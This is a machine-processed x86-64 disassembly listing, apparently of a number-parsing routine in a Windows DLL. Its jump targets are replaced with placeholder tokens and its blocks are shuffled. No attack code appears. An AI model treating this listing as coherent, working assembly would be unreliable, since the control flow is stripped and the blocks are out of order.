mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_180017a9c
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
cmp r8 0x10
jb r-xdata
mov rcx r13
call j_sub_180018b3c
mov r8 [ rbp - 0x11 ]
mov r9 [ rbp - 0x29 ]
cmp [ rsp + 0x3c ] 0x0
jne r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
je r-xdata
cmp [ rsp + 0x3c ] 0x0
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov esi 0x16
cmp r12d 0x8
cmove esi eax
jmp r-xdata
mov r12d 0x10
mov [ rsp + 0x44 ] r12d
xor bl bl
mov [ rsp + 0x38 ] bl
mov rcx rdi
call sub_180014810
jmp r-xdata
cmp r12d 0x10
jne r-xdata
movzx ebx r15b
mov eax [ rsp + 0x44 ]
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_180018450
add rsp 0xd8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx r9
call j_sub_180018b3c
mov [ r14 ] 0x0
cmp r12 0x10
jb r-xdata
mov [ r14 ] 0x30
inc r14
jmp r-xdata
dec rbx
je r-xdata
test rbx rbx
je r-xdata
movzx esi [ rbp - 0x7d ]
test si si
je r-xdata
mov rax [ rbp - 0x79 ]
add rax 0x1f
cmp r14 rax
jae r-xdata
cmp [ r14 ] 0x30
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rbx ]
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
jle r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax si
jne r-xdata
mov [ rsp + 0x38 ] 0x1
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x7f
je r-xdata
inc r14
mov [ rsp + 0x3c ] 0x1
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
xor al al
jmp r-xdata
inc rbx
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r15
cmp rax 0x1
jbe r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rbx ]
mov r12 [ rbp - 0x39 ]
mov r15 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
inc rdx
jmp r-xdata
lea rdx [ rbp - 0x29 ]
mov r9 [ rbp - 0x29 ]
mov r8 [ rbp - 0x11 ]
cmp r8 0x10
cmovae rdx r9
test al al
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
lea rsi [ r15 + 0x1 ]
cmp rsi 0xfffffffffffffffe
ja r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp r12 rsi
jae r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test rsi rsi
jne r-xdata
mov r8 r15
mov rdx rsi
lea rcx [ rbp - 0x51 ]
call sub_1800029e0
jmp r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] sil
mov r13 [ rbp - 0x51 ]
mov r15 [ rbp - 0x41 ]
mov r12 [ rbp - 0x39 ]
test rsi rsi
mov rdx [ rbp - 0x61 ]
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
inc rbx
mov rsi [ rbp - 0x71 ]
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r15 ] 0x0
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae rax [ rbp - 0x51 ]
mov [ rsi + rax ] 0x0
mov r12 [ rbp - 0x39 ]
mov r15 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
sub_180012750
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xe8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r14 r9
mov [ rsp + 0x58 ] r9
mov rdi r8
mov [ rbp - 0x69 ] rdx
mov r12 rcx
mov rcx [ rbp + 0x77 ]
mov r8 [ rbp + 0x7f ]
mov eax [ rcx + 0x18 ]
and eax 0x3000
cmp eax 0x3000
jne r-xdata
lea rdx [ rbp - 0x61 ]
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov r13 rax
mov [ rbp - 0x71 ] rax
xor r15d r15d
mov rsi [ rbp - 0x61 ]
test rsi rsi
je r-xdata
mov [ rsp + 0x28 ] r8
mov [ rsp + 0x20 ] rcx
mov r8 rdi
mov rcx r12
call sub_180013670
jmp r-xdata
lea rdx [ rbp - 0x29 ]
mov rcx r13
call sub_1800088d0
nop
mov [ rsp + 0x40 ] 0x30
mov [ rsp + 0x38 ] r15w
mov [ rsp + 0x4c ] r15d
lea r15 [ r12 + 0x10 ]
mov [ rbp - 0x79 ] r15
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x38 ]
call sub_180017a9c
mov rsi [ rbp - 0x69 ]
mov rbx rsi
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x40 ] 0x0
mov rdx r14
mov rcx rdi
call sub_180014f30
xor r12d r12d
test al al
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x4c ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_180018450
add rsp 0xe8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
xor r14b r14b
mov [ rsp + 0x30 ] r14b
mov esi r12d
mov [ rsp + 0x48 ] r12d
mov [ rsp + 0x4c ] r12d
lea rax [ rbp - 0x29 ]
mov rcx [ rbp - 0x29 ]
mov rdx [ rbp - 0x11 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
mov [ rsp + 0x30 ] 0x2b
mov [ rsp + 0x48 ] r12w
mov [ rsp + 0x4c ] r12d
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
lea r8d [ r12 + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
mov rbx r15
cmp [ rsi + 0x8 ] rbx
cmove rbx rsi
lea rcx [ rsp + 0x4c ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
lea rax [ rbp - 0x29 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] r14b
jle r-xdata
mov [ rsp + 0x30 ] 0x2d
mov [ rsp + 0x48 ] r12w
mov [ rsp + 0x4c ] r12d
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
mov [ rsi ] 0x2b
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
mov r12 [ rsp + 0x50 ]
movzx r12d [ rsp + 0x38 ]
nop [ rax + rax ] eax
cmp [ rbp - 0x19 ] 0x0
jne r-xdata
mov rbx rsi
mov [ rsi ] 0x2d
jmp r-xdata
xor r13d r13d
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp r12w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
movzx r15d ax
movzx r15d r12w
jmp r-xdata
lea rbx [ rsi + 0x1 ]
mov [ rsp + 0x50 ] rbx
mov rcx rdi
call sub_180014810
jmp r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
movzx r13d [ rsp + 0x38 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
movzx ebx [ rdi + 0xa ]
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x8 ]
cmp bx ax
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test r14b r14b
je r-xdata
mov rcx rdi
call sub_1800147a0
movzx r11d ax
movzx eax r12w
add eax 0x9
cmp r11d eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
lea rdx [ rbp - 0x29 ]
cmp [ rbp - 0x11 ] 0x10
cmovae rdx [ rbp - 0x29 ]
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
mov rcx rdi
call sub_1800147a0
cmp [ rsp + 0x38 ] ax
ja r-xdata
mov r12d 0xf
mov [ rbp - 0x39 ] r12
mov r14d 0x1
mov [ rbp - 0x41 ] r14
mov [ rbp - 0x51 ] 0x0
xor ebx ebx
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180014f30
mov r13 [ rbp - 0x51 ]
test al al
jne r-xdata
test r14b r14b
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov eax [ rsp + 0x4c ]
test eax eax
jns r-xdata
movzx esi [ rsp + 0x38 ]
mov r15d [ rsp + 0x4c ]
mov r12d 0xffff
mov rbx [ rsp + 0x58 ]
call sub_180018c10
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ r12 ] al
inc r12
mov [ rsp + 0x50 ] r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov r12 [ rsp + 0x50 ]
test esi esi
jne r-xdata
cmp esi 0x24
jl r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r12 0x10
jb r-xdata
test rbx rbx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
je r-xdata
mov rcx rdi
call sub_1800147a0
movzx r11d ax
movzx eax [ rsp + 0x38 ]
add eax 0x9
cmp r11d eax
jg r-xdata
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ r12 ] 0x30
inc r12
inc eax
mov [ rsp + 0x4c ] eax
cmp [ rdi + 0xa ] si
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r13d r13d
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rbx [ rsp + 0x58 ]
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rbx [ rsp + 0x58 ]
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rsp + 0x50 ] r12
jmp r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax r12w
jne r-xdata
inc [ rsp + 0x4c ]
jmp r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov r15 [ rbp - 0x79 ]
movzx r14d [ rsp + 0x30 ]
mov r13 [ rbp - 0x71 ]
mov rcx r13
call j_sub_180018b3c
jmp r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
test rbx rbx
je r-xdata
test r15w r15w
je r-xdata
mov [ rsp + 0x30 ] 0x1
cmp esi 0x24
jl r-xdata
mov r12 [ rbp - 0x69 ]
movzx eax [ rsp + 0x30 ]
test al al
jne r-xdata
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x4c ] r15d
mov [ rsp + 0x30 ] r14b
mov esi [ rsp + 0x48 ]
mov r12 [ rsp + 0x50 ]
mov r15 [ rbp - 0x79 ]
dec r15d
mov r14b 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r13
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rcx rdi
call sub_1800147a0
mov ecx 0x30
sub cl r12b
add al cl
mov [ rbx ] al
inc rbx
mov [ rsp + 0x50 ] rbx
inc esi
mov [ rsp + 0x48 ] esi
test esi esi
je r-xdata
mov r14b 0x1
mov [ rsp + 0x30 ] r14b
mov rcx rdi
call sub_180014810
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
dec rbx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
jle r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax r15w
jne r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax [ rsp + 0x38 ]
jne r-xdata
inc [ rsp + 0x4c ]
jmp r-xdata
mov eax [ rsp + 0x4c ]
mov rcx [ rbp - 0x29 ]
call j_sub_180018b3c
mov [ r12 ] 0x0
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x65
xor esi esi
mov [ rsp + 0x48 ] si
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rsi + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
test rbx rbx
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rbx ]
jne r-xdata
mov [ rsp + 0x40 ] 0x1
inc rbx
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r14
cmp rax 0x1
jbe r-xdata
mov rcx rdi
call sub_1800147a0
mov ecx 0x30
sub cl [ rsp + 0x38 ]
add al cl
mov rcx [ rsp + 0x50 ]
mov [ rcx ] al
inc rcx
mov [ rsp + 0x50 ] rcx
inc esi
mov [ rsp + 0x48 ] esi
test esi esi
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x7f
je r-xdata
mov [ r12 ] 0x65
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp esi 0x24
jge r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
mov [ rsp + 0x40 ] 0x1
lea rcx [ r--data ]
call sub_180016e60
lea rsi [ r14 + 0x1 ]
cmp rsi 0xfffffffffffffffe
ja r-xdata
mov rcx rdi
call sub_180014810
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rbx ]
mov r12 [ rbp - 0x39 ]
mov r14 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
jmp r-xdata
mov [ rdi ] rsi
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x45
mov [ rsp + 0x48 ] si
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov r14b 0x1
mov [ rsp + 0x30 ] r14b
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp r12w ax
je r-xdata
inc rdx
jmp r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp r12 rsi
jae r-xdata
jmp r-xdata
xor r15d r15d
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi ] rsi
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
cmp r12w ax
je r-xdata
test rsi rsi
jne r-xdata
mov r8 r14
mov rdx rsi
lea rcx [ rbp - 0x51 ]
call sub_1800029e0
jmp r-xdata
mov rdx r14
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
nop [ rax ] eax
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x2b
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] sil
mov r13 [ rbp - 0x51 ]
mov r14 [ rbp - 0x41 ]
mov r12 [ rbp - 0x39 ]
test rsi rsi
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
cmp [ rdi + 0xa ] r13w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ r12 ] 0x2b
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
xor bl bl
mov [ rsp + 0x30 ] bl
mov r14 [ rsp + 0x58 ]
mov rdx r14
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
inc rbx
mov esi [ rsp + 0x48 ]
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r14 ] 0x0
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae rax [ rbp - 0x51 ]
mov [ rsi + rax ] 0x0
mov r12 [ rbp - 0x39 ]
mov r14 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x2d
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r15d r15d
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
movzx ebx sil
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
movzx ebx sil
mov [ r12 ] 0x2d
jmp r-xdata
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov rdx r14
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp esi 0x8
jge r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
